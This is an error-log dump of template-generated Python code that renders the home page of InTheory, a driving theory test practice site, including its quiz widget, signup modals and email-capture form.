377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
